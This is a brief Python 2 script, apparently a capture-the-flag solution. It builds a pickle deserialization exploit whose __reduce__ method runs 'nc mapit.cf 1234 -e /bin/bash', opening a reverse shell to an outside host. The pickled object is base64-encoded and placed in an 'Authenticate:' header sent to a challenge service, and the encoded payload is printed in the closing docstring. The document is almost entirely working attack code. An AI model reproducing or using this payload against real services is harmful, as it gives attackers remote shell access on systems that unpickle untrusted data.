import cPickle
import base64
import os

class Exploit(object):
    def __reduce__(self):
        self.payload = 'nc mapit.cf 1234 -e /bin/bash'
        return(os.system, (
                self.payload,))
# token to be sent
token = str(base64.b64encode(cPickle.dumps(Exploit())))
print(token)


"""
Payload
nc chall 60005
AUTH admin HTTP/1.0
Authenticate: Y3Bvc2l4CnN5c3RlbQpwMQooUyduYyBtYXBpdC5jZiAxMjM0IC1lIC9iaW4vYmFzaCcKcDIKdFJwMwou

"""
